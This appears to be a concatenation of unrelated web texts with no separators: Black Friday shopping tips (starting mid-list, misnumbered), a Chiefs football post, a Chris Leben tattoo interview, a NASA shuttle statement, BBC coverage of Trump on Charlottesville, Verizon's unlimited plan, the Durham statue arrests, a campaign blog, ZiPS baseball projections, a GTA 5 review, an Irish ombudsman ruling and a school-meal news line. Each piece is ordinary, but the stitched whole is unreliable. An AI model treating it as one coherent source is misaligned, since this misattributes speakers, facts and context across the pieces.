Take a look at #1. Didn't train? Then make sure you do your stretches before heading out. You'll be pushing carts, holding bags, and picking out items that are both high and low on shelves. Make sure you're ready!
22. When in Doubt, Know Your Way Out
If you decide to go somewhere crazy (like Walmart), make sure you know your exits. Seriously. People are crazy there. Don't get shot.
31. Check the Back Seat
The Holidays are a gold mine for looters. Make sure everything's locked, and check your backseat: make sure you can't see any packages or bags from the outside.
32. Enjoy the Little Things
You know, like free snow globes.
Enjoy Black Friday and stay safe!

OK, this is a fantabulous stretch of plays for Derrick Johnson. All in a row. I swear am not making this up.
At the start of the second quarter, Chiefs LB Derrick Johnson almost single-handedly stopped the Raiders.
Read on for epic, epic domination.
1. Derrick Johnson saves a touchdown by running down Michael Bush, sprinting halfway across the field. Brandon Flowers is not making that tackle.
via assets.sbnation.com
2. On the next play, Derrick Johnson saves a touchdown. He takes out the blocker, who takes out Michael Bush, who is going to charge in for a touchdown if DJ doesn't blow this up.
3. On the next play, Derrick Johnson saves a touchdown. He completely stops Bush's momentum. I'm guessing Bush goes somewhere around 270. Stupendous.
via assets.sbnation.com
4. On the next play, Derrick Johnson saves a touchdown. Well, sort of. He's the first guy to halt Bush's momentum if you ask me. You can see his red helmet penetrating at the line. This isn't as impressive as the other plays.

5. On the next play, Derrick Johnson saves a touchdown and the Chiefs hold on 4th and goal. We have Derrick Johnson, and he is coming for you. Hide yo wives, hide yo kids, hide yo michael bush...

It's easy to forget that when Chris Leben first entered the public consciousness as the spritzing, door-smashing ne'er-do-well on the first season of The Ultimate Fighter, he did so with near-unadorned skin. Because in the years since, every time he's stepped in the cage to either collect a scalp or offer up his own, audiences could see new outlines and fill-ins encroaching on his body. Now Leben is a walking advertisement for artists Jason Taulbee, Mike Ledger, Dominick McIntosh, and Richie Lucero—the guys that have since covered him from the neck down in mammoth tattoos. Here, Leben tells Fightland about the present his brother gave him on his 18th birthday, getting inked while staying sober, and the samurai on his back that, it turns out, isn't actually a samurai at all.
Chris Leben: I think pale white skin is just a little boring. Liven it up. You move into a new house, the walls are white, and what do you do? You paint a few walls different colors and throw up some pictures, you know what I mean? And that's really what I'm doing.
I really got [tattoos] as a way to stand out. All my work is big—I want stuff that people can see from 20 feet away when I'm fighting. I want people to be able to see my tattoos and recognize me. Tattoos are a portrayal of me.
I'll be honest with you: The main reason that I have tattoos is to look cool. That's it.
A lot of people say, “Well, what if you don't want ‘em when you're old?” You know what, I tend to know myself, and I have the confidence to know that I'm okay with this now, and down the road, I'm still gonna be okay with it. It's just going to remind me of who I was and where I was at.
It was my 18th birthday when I got my first tattoo. I got a little dragon on the back of my right calf. My brother actually paid for it—nice guy. Probably the only birthday present he ever got me: He took me to the tattoo parlor and got me tattooed. That's what family does!
He had this angry, screaming leprechaun on his arm that he had just got, and he wanted to take me to the same spot to get some super-cool tattoo work. So we went down and we just picked it right off the wall and put it on. I remember I wore shorts for a month straight, no matter how cold it was, showin' off my badass tattoo.
It cost a buck seventy-five. He didn't let me forget it.
I got the dragon and then I joined the army. When I was in the army, I met this guy in Virginia Beach who told me he was a fantastic tattoo artist. By my dragon, I wanted to get a samurai's head and flames all around it. The guy was like, “Okay, cool, no problem, come on over to my house”—which I should've known signaled that it was a bad idea.
He's looking at my leg, and he's like, “You know what man, I see this thing in like a big ball of fire, I dunno about the samurai head—I don't think it's gonna look good. We should just do flames.” And he did the worst flame job ever—ever. Like a 6-year-old could have done better with a Sharpie.
That is a Japanese oni mask. And as the story goes, apparently it's pretty well known as the symbol for jealousy and rage. Basically, a rich lady was on her way home, she walked in and found her husband having sex with another lady, she murdered her husband and the other lady, and then killed herself. The mask is actually the look on her face as she killed herself. Now, she's a ghost and she stops couples that are in love. She's a jealous ghost.
I came in one day and Jason was like, “Hey dude, I got an idea for your shin. Check this out.” And I'm like, “Fuck yeah!”
I got the front done, and Jason did flames around the guy from Virginia Beach's flame job, so it's a little bit of a cover up. The big piece on the front was really to take away from the junk on the back.
Jason was up in Portland, Oregon—he had a shop, and he had a guy come in, a Mongolian who was selling artwork, and he bought a couple of this guy's paintings.
The painting that I had tattooed on me is Genghis Khan, done by an actual Mongolian guy, but everybody assumes it's a samurai. For the first six months that I had it, I kept going, "No, it's actually a Mongolian." Finally, it was, “Oh, I love that samurai.” Oh yeah, thanks. Technically, it's a Mongolian, but who knows the fuckin' difference? I know I don't.
I kinda look at myself as a modern-day gladiator. Sure, we're not fighting to the death, but in today's society, my job is about as close as you come to being a modern-day gladiator. Having a picture of a warrior from the past in battle is fuckin' cool looking, and there's not really much more to it than that.
The kanji says “Bushido.” I know it doesn't say, “In a relationship of two men, I play the woman.” I know it doesn't say something like that because my ex-girlfriend's mom was from Japan, she does calligraphy, and she did the calligraphy for me.
I went to Richie Lucero originally to get a portrait on my neck of my wife as a geisha zombie eating my heart. Kind of a tribute—not even ‘til death do us part.
Her parents love it. I'm being facetious. Absolutely. Her dad looked at it and he's all, “Who's that supposed be?” It's your daughter. “Huh.” I don't know what that means—he went, “Huh,” and walked off.
The artists always ask me, "Do you want this? Do you want that?" And I say, “Look, the most important thing to me is that it looks as sick as possible.” Nobody tells Picasso whether he [should use] red or blue.
I really wanted to get my side done. But it's so painful, and now that I don't take pain medicine and I don't drink, I really didn't know how I was gonna get through it. So as I'm talking about my neck, he was actually one of the first artists to realize this is a great avenue for him to get more recognition … The next thing I know, we're drawing on my ribs on my left side, and that first session went for eight hours. Just a couple of ibuprofen. It was terrible.
Everybody's always like, “But you're a tough guy.” Well, usually when people are punching me, I get the option to block. I might not be very good at it, maybe I don't do it, but at least I can try. When I'm getting tattooed I just gotta lay there and take it, you know?
I thought it was a clever excuse: “As an athlete, I'm more in touch with my body, and because I'm more in touch with my body, I feel pain a little bit more. I'm more sensitive to my body's inputs.” That's bullshit, really. Actually, maybe it's 90 percent bullshit—I think in some ways that's true. Some people are sedentary and they don't really use their bodies—it's almost like it's gone numb. They just kinda block out their body. All their muscles are locked up and they don't feel as much.
I got a super fan from Sweden—he got, on his whole upper arm, a tattoo of me. He's literally got a tattoo of me, and he's got a tattoo of my tattoos! It's pretty fuckin' good.
I dunno, man—you know you made it a little bit, that's kinda cool. Like, fuck, I'm in a video game, I have an action figure, and someone has me tattooed on them. But at the same time, some guys at the gym definitely put me on blast for it. I got some cracks.
I was sponsored by Vince Neil Ink, his tattoo shop right out there on the strip. And I remember sitting there with Vince Neil and a couple of his rock and roll buddies, and all of their tattoos are about silver-dollar size. They're covered [with tattoos], and every one of them is a story like “I was drunk in Panama” or “I was fucking with this hooker in Amsterdam.” They're definitely story starters.
I would have to say never have tattoos brought me good fortune. Except when I was getting processed in jail, it took them a lot longer because they try to detail out every tattoo and tell what it is. That kept me out of the cell for a while.
There's nothing I would ever take off. Whenever I get a new tattoo, I notice I'm always looking at it. After a while, they become who I am—they become a part of me. It'd be like asking Marilyn Monroe to take off her freckle. Jason Taulbee said, “Here's the thing: A tattoo is a permanent reminder of a temporary feeling.”

At today's final landing of the space shuttle, we had the rare opportunity to witness history. We turned the page on a remarkable era and began the next chapter in our nation's extraordinary story of exploration.
The brave astronauts of STS-135 are emblematic of the shuttle program. Skilled professionals from diverse backgrounds who propelled America to continued leadership in space with the shuttle's many successes. It is my great honour today to welcome them home.
I salute them and all of the men and women who have flown shuttle missions since the very first launch on April 12, 1981.
The shuttle program brought our nation many firsts. Many proud moments, some of which I was privileged to experience myself as a shuttle commander. I was proud to be part of the shuttle program and will carry those experiences with me for the rest of my life.
As we move forward, we stand on the shoulders of these astronauts and the thousands of people who supported them on the ground – as well as those who cheered their triumphs and mourned their tragedies.
This final shuttle flight marks the end of an era, but today, we recommit ourselves to continuing human spaceflight and taking the necessary and difficult steps to ensure America's leadership in human spaceflight for years to come.
I want to send American astronauts where we've never been before by focusing our resources on exploration and innovation, while leveraging private sector support to take Americans to the International Space Station in low Earth orbit.
With the bold path President Obama and Congress have set us on, we will continue the grand tradition of exploration.
Children who dream of being astronauts today may not fly on the space shuttle ... but, one day, they may walk on Mars. The future belongs to us. And just like those who came before us, we have an obligation to set an ambitious course and take an inspired nation along for the journey.
I'm ready to get on with the next big challenge.
The future is bright for human spaceflight and for NASA. American ingenuity is alive and well. And it will fire up our economy and help us win the future, but only if we dream big and imagine endless possibilities. That future begins today.

US President Donald Trump has spoken out against racist violence after the killing of a protester in Charlottesville, Virginia, on Saturday.
"Racism is evil and those who cause violence in its name are criminals and thugs," he told reporters.
He said the Ku Klux Klan, neo-Nazis and white supremacists were "repugnant" to everything Americans held dear.
Mr Trump was criticised for not specifically denouncing extremists in his initial comments on the violence.
Heather Heyer, 32, died and 19 others were hurt when a car rammed into people protesting against a far-right march.

James Alex Fields, 20, was formally charged on Monday with second-degree murder, three counts of malicious wounding and one count of hit and run. He was also denied bail during his appearance in court via video from jail.
He is said to have harboured Nazi sympathies.
The justice department is opening a civil rights investigation into the incident.
'Egregious display'
On Monday, Mr Trump arrived back at the White House from his golf estate in Bedminster, New Jersey, to issue a comprehensive condemnation.

"We condemn this egregious display of hatred, bigotry and violence," he said. "It has no place in America."
"Those who spread violence in the name of bigotry strike at the very core of America,"
He paid tribute to Ms Heyer as well as two police officers killed in a helicopter crash after helping to tackle the unrest.
Ms Heyer's mother, Susan Bro, thanked the president for his "words of comfort and for denouncing those who promote violence and hatred".

She told NBC News in a statement she also sent her condolences for the families of the two state troopers who were injured.
But some felt Mr Trump's comments came too late.
Civil rights activist Rev Al Sharpton criticised Mr Trump for waiting 48 hours before issuing a full condemnation.
"We had the head of state of Germany speak before we had the president of this country," he told MSNBC.
"His silence spoke volumes to people. It was too little, too late."
A fire of Trump's own making
Anthony Zurcher, BBC News, Washington
On Monday afternoon Donald Trump tried to put out yet another fire of his own making. The president prefaced his explicit condemnation of the KKK, neo-Nazis and other white supremacists with the words "as I said on Saturday" - but the problem was he had said nothing of the sort.
In the hours after the violence in Charlottesville, Mr Trump had offered a broad condemnation of "many sides" - and caught hell for it from liberals and members of his own party, who felt compelled to break ranks with their leader.
Two days later, the president was in front of cameras again, with words that should have been easy - and obvious to most in a nation that expects its presidents to be comfortable condemning racist extremism.
Even on Monday, however, the president's strong words were undermined somewhat by his off-topic introductory boasts of the nation's economic strength and the fact that his obviously carefully crafted statement was read off teleprompters - a practice for which candidate Trump regularly mocked Barack Obama.
After finishing his remarks, the president quickly exited the room, as reporters asked why he had not spoken sooner. The president did not answer, but such questions will follow him in the days ahead.
Attorney General Jeff Sessions said earlier that the deadly violence in Charlottesville met "the definition of domestic terrorism" - a phrase which Mr Trump declined to use to describe the events.
Mr Sessions announced on Saturday the Justice Department had opened a federal civil rights investigation into the deadly incident.
Hundreds of white nationalists had convened in Charlottesville to protest against the removal of a statue of a general who had fought for the pro-slavery Confederacy during the US Civil War.
They were challenged by anti-fascist and counter-protesters and the rally erupted into violent clashes. Shortly after, Ms Heyer and several others who were leaving the area were struck by the car.

Protests and vigils in solidarity with the victims were held in many US cities on Sunday. In Seattle, police used pepper spray to stop protesters approaching a pro-Trump rally.
Among those to criticise Mr Trump was Ken Frazier, CEO of drugs giant Merck, who announced on Monday he would resign from the president's American Manufacturing Council.
Mr Frazier, who is African American, tweeted that he had "a responsibility to take a stand against intolerance and extremism".
John Kerry, who was US secretary of state under Barack Obama, said that Mr Trump's initial reaction to the death in Virginia had been more telling.
"No matter what @potus says now-first instincts always revealing; his was to look into the camera and say 'many sides' - that cant be erased," he wrote in a tweet.
Verizon said on Sunday it will launch an unlimited LTE data plan, called Verizon Unlimited, on Monday. The plan starts at $80 a month for one line or $45 a line for a group of four on smartphones or tablets. Both new and existing subscribers can sign up.
The move marks the first time in more than five years that Verizon, the nation's largest carrier in terms of total subscribers, will have an unlimited offering. The carrier recently started forcing heavy users who had stayed on old unlimited plans to move to new offerings.
Executives at the company have downplayed the need for unlimited plans in recent months, too, though the carrier started allowing customers last fall to pay for unlimited usage in 30- and 60-minute increments.
The new plan comes on the heels of other renewed and aggressive pushes into unlimited data from rival carriers, most notably T-Mobile, which has grown in recent months while Verizon's mobile division has slowed, and in August replaced all its existing mobile plans in favor of one unlimited offering called T-Mobile One.
T-Mobile's plan has faced criticism, however, for downgrading all video streams to a non-high-definition resolution unless subscribers pay an extra $15. It also does not allow subscribers to access LTE speeds when using their phones as a mobile internet hotspot by default.
Verizon appears to be directly going after those complaints. The carrier says its unlimited plan allows users to stream video at an "HD" resolution and that it includes up to 10 GB of LTE mobile hotspot data before cutting that to 3G speeds. The carrier did not specify whether it allows videos to stream above a 720p resolution, the minimum threshold for HD video, though.
Verizon says the plan also provides unlimited calling and texting to Canada and Mexico, along with 500 MB a day of LTE data in those countries. A $10-a-day pass allows for that same amount of data outside of North America.
Thomson Reuters
Verizon is keeping other tiered data plans available alongside the new unlimited plan, including a 5 GB a month offering, as well as its S, M, and L plans. Currently, those plans go from $35 a month for 2 GB of LTE data to $70 a month for 8GB of data. Verizon previously offered plans with larger data buckets on its site, but those will now only be available in stores or over the phone.
The $80-a-month starting point makes Verizon's unlimited plan costlier than T-Mobile One, which starts at $70 a month for a single line, and Sprint's unlimited data plan, which normally costs $60 a month. But it is less expensive than AT&T's unlimited plan, which starts at $100 a month and only comes bundled with a subscription to the carrier's DirecTV or U-Verse services.
Like some of those rival offerings, Verizon's plan requires you to enroll in auto-billing to get the lowest price possible. While its four-line group plan is $45 a month ($180 total), Verizon says a two-line plan costs $70 a month per line ($140 total), while a three-line plan costs $54 a month per line ($162 total).

Verizon is still generally seen as having the fastest and most widely available network in the US, though a recent study from the mobile-analytics firm OpenSignal found that T-Mobile has largely caught up when it comes to average speeds.
In any case, Verizon's new plan comes with the same caveat as every other unlimited offering: It's not technically unlimited. Verizon says any line that uses more than 22 GB of mobile data in a month may see its data "prioritized" behind other customers in times of network congestion. T-Mobile, Sprint, and AT&T warn of similar limits, too.
Still, that allotment should be enough for most people and would seem to give Verizon a plan it can sell to hungrier users in an increasingly data-heavy time.

— Three more people were arrested Wednesday in the vandalism of a Confederate statue on Monday night in Durham.
Dante Emmanuel Strobino, 35, and Ngoc Loan Tran, 24, both of Durham, were arrested at the Durham County Courthouse, where a woman who climbed the statue was making her first appearance after she was arrested Tuesday. Peter Hull Gilbert, 39, also of Durham, was arrested Wednesday afternoon.
All three are charged with disorderly conduct by injury to a statue and damage to real property, which are both misdemeanors, and participation in a riot with property damage in excess of $1,500 and inciting others to riot where property damage exceeds $1,500, which are both felonies.
Takiyah Fatima Thompson, 22, of Garner, was arrested Tuesday and charged with the same crimes, and authorities said more arrests are expected.
A group of protesters rallied in Durham on Thursday morning in support of the people arrested.
Thompson and Tran identify themselves as being part of the Durham branch of World Workers Party, a group that identifies itself as a group of revolutionary socialists.
"There are revolutions taking place all across the country right now, and those revolutions won't be stopped," Thompson said after her court hearing.
"We are following a historical legacy of standing up to the powers that be, to these racist, fascist systems, and we're on the right side of history," Tran said. "We're not going to let the police or this jail intimidate us."
The protesters tore the statue down Monday after a white nationalist rally on Saturday in Charlottesville, Va., ended with one woman dead and almost two dozen injured. The events in Charlottesville sparked rallies around the country in support of counter-protesters.
Durham County authorities were using video from the Monday night protest to identify the people involved in the vandalism.
A search of Gilbert's house turned up various documents and computers, but police didn't find the Cadillac limousine and a ladder that investigators said was strapped on top of it and then used in the protest to scale the granite podium on which the statue stood, according to a search warrant.
Sheriff Mike Andrews called the protesters' actions "a blatant violation of the law," but he said no one was arrested during the demonstration because officials worried about injuries in the resulting chaos.
"Don't mistake restraint for inaction," he said Tuesday. "Had I ordered my deputies to engage a hostile crowd, there would have been serious injuries. Statues can be replaced; lives cannot."
Calls to remove Confederate statues are gaining more traction across the country, but a 2015 North Carolina law limits the movement of such monuments. Gov. Roy Cooper on Tuesday called for the repeal of the law, saying leaving the monuments up could be dangerous.
"My first responsibility as governor is to protect North Carolinians and keep them safe," Cooper said in an online post. "The likelihood of protesters being injured or worse than they may try to topple any one of the hundreds of monuments in our state concerns me. And the potential for those same white supremacist elements we saw in Charlottesville to swarm the site, weapons in hand, in retaliation is a threat to public safety."
After being released on bond, Tran said she wants to see Cooper take action on removing Confederate monuments.
"Clearly, in Durham, we showed Gov. Roy Cooper that, if he didn't take action, we would," Tran said. "So, to Roy Cooper, we say, 'You're welcome,' because it wasn't his original idea to take down these statues. So, we'll see what actions he takes next, but we want to claim that [pulling down the Durham statue] as a win for the movement. The movement did this."
Also, I can actually verify that she does read what people post on Twitter, but the fact that she was able to cite specifics to audience members again just shocked me.
This is also the first time I've ever heard a political candidate - either one of my clients or one I've heard speak, who actually understood our potential beyond volunteerism. She actually talked about the remarkable ability young people have at coming up with creative solutions that older generations wouldn't have thought about. She talked about the ability of youth to think globally because we're more connected globally and she talked about a key component to heartland youth specifically - jobs for young people within our own state.
"We need your help in figuring out what the ideas are to put in practice so we can tell every child in Oklahoma that a public education is a quality education in this state. We need to be figuring out what you think are the best ways to keep those kids in school before they drop out. And then we have to figure out for all of our young people, whether they stay in school or they don't stay in school how do we help you get the skills that you need to fill the jobs that we have in Oklahoma, so that you know that you have the ability to stay here to meet your own bills here to do things in this state where your roots are."
I've worked for a lot of candidates, really good people that I believe in and who have been elected or should have been elected, but few of them understood young people on any kind of meaningful level. I only work for good people, and I'm proud of what they do, but seriously this is the first time with any candidate my old political cynicism fell to sheer amazement. Watch the speech here:
So, even though its coming from someone who's working part time on the race, please know I've never had a client, not now... not ever who has ever been so on the nose. I'm excited to be involved.

After having typically appeared in the very hallowed pages of Baseball Think Factory, Dan Szymborski's ZiPS projections have been released at FanGraphs the past couple years. The exercise continues this offseason. Below are the projections for the Texas Rangers. Szymborski can be found at ESPN and on Twitter at @DSzymborski.
Other Projections: Arizona / Atlanta / Baltimore / Boston / Chicago AL / Chicago NL / Cleveland / Colorado / Detroit / Houston / Los Angeles AL / Los Angeles NL / Miami / Milwaukee / Minnesota / New York AL / New York NL / Oakland / San Diego / San Francisco / St. Louis / Seattle / Tampa Bay / Washington.
Batters
One doesn't wake up every morning to find articles in the morning dailies arguing on behalf of Adrian Beltre's Hall of Fame candidacy, and yet all indications are that, even were he to retire this second, he'd be a deserving inductee. Both his career WAR and also JAWS figures currently reside above the threshold for the average Hall of Fame entrant. ZiPS projects him to add four more wins to his resume in 2015.
Mike Petriello has already written this week about the Arizona Diamondbacks and their curiously shallow catcher depth chart. A properly motivated individual would probably have some luck composing a similar piece regarding the Rangers' left-field spot. Jake Smolinski (468 PA, 0.1 WAR) is the favorite to earn the starting role there, while Michael Choice (559 PA, -0.4 WAR) is another candidate.
Pitchers
Since his arrival in the major leagues before the 2012 season, right-hander Yu Darvish is the only pitcher among all qualifiers to have recorded a strikeout rate above 30%. His projected strikeout rate for 2015 (29.8%) is just slightly below that threshold, but would have also still represented the third-best mark among qualifiers in 2014. Which, rephrased: Yu Darvish, even after having been adjusted for age and regression, still profiles as basically the league's best strikeout pitcher (among starters).
Beyond Darvish, there's less cause for optimism. ZiPS calls for Yovani Gallardo to record his highest WAR figure (2.8 WAR in 179.0 innings) since 2011. Left-hander Alex Claudio, meanwhile — who features a changeup that would surprise and astonish certain Warner Bros. animators — also receives a reasonably encouraging projection relative to his pedigree and arm speed (88.0 IP, 0.8 WAR). Otherwise, there's little here to inspire enthusiasm.
Bench/Prospects
Among hitters, third-base prospect Joey Gallo (531 PA, 1.3 WAR) represents both the club's top rookie-eligible player and also the best one (i.e. the best player) not expected to receive regular plate appearances at the beginning of the season. His power is such that, even with a 42.2% projected strikeout rate, he's still forecast to produce a basically league-average batting line. Among pitchers, Phil Klein, who recorded a nearly 30% strikeout rate in a limited sample last year, appears capable of providing competent innings for the bullpen.

Disclaimer: ZiPS projections are computer-based projections of performance. Performances have not been allocated to predicted playing time in the majors — many of the players listed above are unlikely to play in the majors at all in 2014. ZiPS is projecting equivalent production — a .240 ZiPS projection may end up being .280 in AAA or .300 in AA, for example. Whether or not a player will play is one of many non-statistical factors one has to take into account when predicting the future.
Players are listed with their most recent teams unless Dan has made a mistake. This is very possible as a lot of minor-league signings are generally unreported in the offseason.
ZiPS is projecting based on the AL having a 3.93 ERA and the NL having a 3.75 ERA.
Players that are expected to be out due to injury are still projected. More information is always better than less information and a computer isn't what should be projecting the injury status of, for example, a pitcher with Tommy John surgery.
Regarding ERA+ vs. ERA- (and FIP+ vs. FIP-) and the differences therein: as Patriot notes here, they are not simply mirror images of each other. Writes Patriot: “ERA+ does not tell you that a pitcher's ERA was X% less or more than the league's ERA. It tells you that the league's ERA was X% less or more than the pitcher's ERA.”
Both hitters and pitchers are ranked by projected zWAR — which is to say, WAR values as calculated by Dan Szymborski, whose surname is spelled with a z. WAR values might differ slightly from those which appear in full release of ZiPS. Finally, Szymborski will advise anyone against — and might karate chop anyone guilty of — merely adding up WAR totals on depth chart to produce projected team WAR.
Grand Theft Auto 5 releases on Xbox One and PlayStation 4 today, bringing Rockstar's expansive open world game to the new generation of consoles. Digital Foundry will be assessing the technical differences throughout the week, and we'll be bringing you more on what's new and how the original stands up nearly a year on from its release. To start, though, here's our original review, first published in September 2013.
If there was one criticism of Grand Theft Auto 4 that evidently stung Rockstar, it was the complaint that it lacked an endgame. Liberty City was an incredible place, cramming as much character into one city block as most open worlds manage in a thousand, but once Niko settled his last score, there wasn't much to do but cruise around waiting for the DLC.
Grand Theft Auto 5 is a welcome overreaction. Rockstar has rammed Los Santos and the surrounding desert and mountain areas with more things to do than I could describe in half a dozen reviews. I'm not sure it feels like the biggest open world in the series' history, but I think that's just because it's so easy to travel across quickly, and it's certainly the most densely packed with hedonistic thrills, stuff to buy and steal, random events and weirdoes who want something. Then there's the promise of GTA Online, the evolving, persistent multiplayer component due to land for free at the start of October.
Packing in all those activities - from trash-diving to skydiving - hasn't impeded Rockstar's world-building either. Los Santos takes the basic geography of Los Angeles and files it down into something tight and entertaining to navigate, where every street has its own story etched in phony colonnades or chain-link fences and landmarks are lifted from real life (Grauman's Chinese, Chateau Marmont) or the silver screen (the house on stilts in Lethal Weapon 2 springs to mind), then woven together with practised ease.
You can play tennis, go parachuting, take part in all sorts of races, hold up shops, tow vehicles, hunt deer and try to legalise marijuana, among many, many other things.
Layered on top of that is Rockstar's trademark cynicism. GTA 4 took a few swings at fear-mongering 24-hour news, right-wing neo-cons and reality TV, but GTA 5 is spoiled for choice and the gag writers go for the jugular, skewering TV talent contests, self-help gurus, social media, internet trolls, political hypocrites and our obsession with sex, sex, sex. You can't go half a block without walking into a punch line and every radio ad is telling you to buy a new smartphone because you might as well get that last bit of liquidity out of the house while you still can, or else just keep jacking off in the garage after the kids have gone to sleep.
Troubling moments? Grand Theft Auto has been no stranger to controversy over the years and GTA 5 clearly aims to be no more of a stranger than any other instalment. Sex isn't really the issue. There are functioning strip clubs where you can buy lap dances and try to convince girls to take you home, although there's no Hot Coffee mini-game and the dances are silly rather than especially sordid. There are also a couple of graphic representations of sex in the game, but nothing worse than you would see in a movie or TV show. Where GTA 5 goes a little overboard is in a mission around a third of the way through the game, where it takes violence in the series to a new and unpleasant extreme. It's not a great moment for the game, which can't pull it off without it feeling gratuitous. I've gone into my thoughts about it separately in another feature, which naturally carries a spoiler warning: Is the most disturbing scene in GTA 5 justified? Short answer: not really.
Perhaps these are obvious targets and perhaps GTA has little to add to the discussion, but the way the writers and designers crystallise what's absurd about them is still rare and welcome in a mainstream video game, and it feeds into what I love most about GTA: cruising around, glorying in the details and watching and listening as the game holds mirrors up to things we see every day - and then breaks them over someone's head. There's an intoxicating richness to that experience when you first arrive in Los Santos that I've missed in the five long years since GTA 4, and the game bites just as sharply after 30 hours.
The main thoroughfare through the game, though, is Rockstar's latest narrative hike up the criminal mountain, except this time it's delivered with a twist: GTA 5 has not one but three main characters, each with his own history and goals. Michael's a retired bank robber, bored out of his mind in a Vinewood mansion where his wife flirts with the tennis coach and the kids play video games and hang out with sleazebags. Franklin's more sympathetic - a young black man with a gangster-wannabe best friend and an appetite to learn. Trevor, who we meet later, is a certifiable bad guy who kills people for no reason and is tougher to like.
Things start off interesting as Rockstar plays it fairly straight, dragging Michael out of retirement with wit and a few good set-pieces as Franklin falls into step alongside him, before they plan a heist together and Trevor comes onto the scene. Apart from a few story-specific periods, you can switch between the three of them at any time by picking someone else on the character wheel. The camera zooms out into the sky, pans to their location and zooms in to find them - you might catch Michael cycling through the hills or Trevor waking up half-naked under a rock - in a process that only takes a few seconds. If they're in the same location then the transition is instant.
GTA 4's famously bouncy suspension is gone, replaced with more refined physics. Cars have a habit of self-righting now, too, so you spend less time cursing while upside down.
The best thing about their adventures together, which span 69 story missions, is that it breathes new life into Rockstar's mission templates. You still spend a lot of the game driving around having conversations, crouching behind walls, hunting down red blips on your mini-map and watching people swear at each other creatively in cut-scenes, but in the heat of battle you have more tactical options, and Rockstar has more directorial ones.
A high-speed chase on a freeway can see Michael firing out his window while Franklin climbs aboard a stolen yacht on a trailer, for instance, or Michael can shoot out a plane's engine with a high-powered rifle so Trevor can chase it on a dirt bike until it crashes spectacularly in the desert. Even simple gunfights are elevated by the ability to switch from Trevor in cover here to Michael on overwatch there to Franklin sneaking around on the flank. There are different approaches and outcomes throughout, and far fewer standard shooting galleries. Each character has a special ability, too - Franklin can briefly slow down time while driving, for instance.
The high points are the heists, where the gang's tech wizard friend Lester puts together a plan, you choose the approach and backup personnel, and then the trio spread out and collect the materials needed to pull it off before everyone plays a part in the score. It's all very scripted and stage-managed - go buy three boiler suits, steal a fire engine, modify some cars and stash them under a bridge - but each heist has a blockbuster set-piece feel to it, and when they go to plan and you walk away with a thick stack of cash to spend on Los Santos' many expensive distractions, you feel like you're living the life.
Individually, each character is good fun to be around and Michael and Franklin make an entertaining father-and-son type duo.
In a way, though, your criminal success is also the downside to GTA 5's lengthy story, which loses its way after an interesting start. Michael and Franklin could both carry interesting games on their shoulders - Michael's going through a midlife crisis, depressed because he can't control his family after giving them everything, while Franklin's torn between his roots and a desire for more. When Trevor arrives, though, the game reverts to a standard crime story - can't escape my past, enemies everywhere, one last job, etc - and more interesting themes are abandoned in favour of endless cut-scenes of roaring arguments.
Customs and exercise There's a lot more scope for customisation of weapons and cars in GTA 5. AmmuNation has a huge range of guns and add-ons for them - I tended to whack a silencer and a scope on anything I could and grew very fond of jerry cans and sticky bombs. Los Santos Customs respray shops also let you upgrade vehicles with more than just paint jobs - bulletproof tyres and chrome plating work very nicely on that superfast getaway car. Each character also steadily improves their physical attributes over the course of the game, including stamina, strength and damage dealt. This stuff has a less perceptible impact on the game, but you can max it out by taking part in various activities if you wish.
The problem is that Trevor is an asshole. When you first meet him, he does something so unpleasant that you wonder how you're ever going to empathise with him, and before long you're rotating an analogue stick so he can pull a tooth out of someone's jaw with a pair of pliers. These are serious and intense moments, but Trevor is too shallow and unconvincing to justify them, and instead his antics derail the narrative. He's such a distraction to Michael that his family become a footnote rather than a subplot, while Franklin is almost completely forgotten until a bit of last-minute catch-up near the end of the game. The outcome ties up loose ends, but I'd lost interest by then.
All the heist stuff is difficult to reconcile with the world Rockstar has built, too. This is a game pretty much designed from top to bottom to equate the American Dream to some sort of elaborate pyramid scheme, but the message is that hard graft buys you a mansion in the hills, a helipad downtown and a fleet of tricked-out sports cars? This contradiction was at the heart of Vice City, too, but it made more sense in a love letter to Scarface. GTA 5 captures the absurdity of modern life, but I expected it to do more than join the party.
When the story cuts loose from the hard-edged heist film template and has some fun, it's much more entertaining. Trevor's missions are a perfect example - when the writers stop treating him as a serious character, sending him off to hijack a plane or rob a money train instead, the rage goes out of his voice and he feels like the cartoon creation underneath. Franklin's adventures with his friend Lamar are the kind of unpredictable, high-energy capers that stick in the memory, too, and a great chance to spend time with Lamar, who steals every scene he's in.
GTA 5 is at its best when it starts cracking wise and doing impressions of half-remembered movie set-pieces.
A greater emphasis on this stuff would have been more welcome and honest in a game of nihilistic thrill-seeking, but GTA 5 is still an easy sell. There's so much excellent stuff to do, see and hear throughout the dozens of hours you can spend touring Los Santos that you'll easily overlook the inconsistencies in storytelling, if that stuff even bothers you in the first place. This is also the slickest, easiest GTA game Rockstar has ever made, full of fine detailing that smoothes your experience moment to moment, like proper checkpointing and gentler law enforcement.
Most importantly, though, it's the first game in the series where you feel as though you can strike out in any direction and find something entertaining to do. You can wander onto a golf course and find yourself in a reasonable facsimile of a Tiger Woods game, enhanced after every shot by Michael swearing and banging his club on the fairway. There are innumerable well-hidden items to recover, some of which are well protected. At one point I drove into the desert and found some sort of camper van, got out of my car, heard a weird zapping noise, then woke up naked on a railway line. Mystery! Serendipity! There's a huge prison complex I haven't even been to yet. It goes on and on.
GTA 5 may not be the Hollywood-beating crime story it wants to be, then, but it's the best video game it's ever been, and I'll take that.
We've also got a guide to all the GTA 5 cheats, plus loads of money-making tips.
THE OMBUDSMAN FOR Children Emily Logan has ordered the HSE to pay costs for a nine-year-old child to travel abroad for a limb-lengthening operation.
The Office of the Ombudsman for Children found that the child's family had been wrongly told they owed €5,000 for accommodation that was not covered by the executive's scheme for treatment abroad.
The boy requires extensive surgeries to lengthen his limbs, having been born without a right femur or hip or a left arm.
The family researched a number of international healthcare providers, eventually settling to spend four months in Baltimore in the US. Their health insurer covers the operations, of which there will be several over the coming years.
In 2009, the family were told that they would receive travel and subsistence costs from the HSE, though this would be on a discretionary basis. However, in 2011 this was stopped.
The HSE argued that as the treatment was now being provided in the UK, it would not be paying for travel to the US. The family want to stay with the same specialist that they have been working with since 2007.
The Ombudsman's report says that removing the costs would stop the boy's treatment, something the family argues would be “life-limiting”.
The boy told the Ombudsman's office that without the treatment, “I will be in a wheelchair until I am dead.”
Logan recommended that the HSE honour their agreement to fund the travel or make an alternative arrangement.
She added that although the executive has since changed their policy, the original assurances had been made in writing two years before these changes.
76 students of a government school in Rajasthan's Bhilwara district today fell ill after consuming their mid-day meal in which a dead lizard was found.
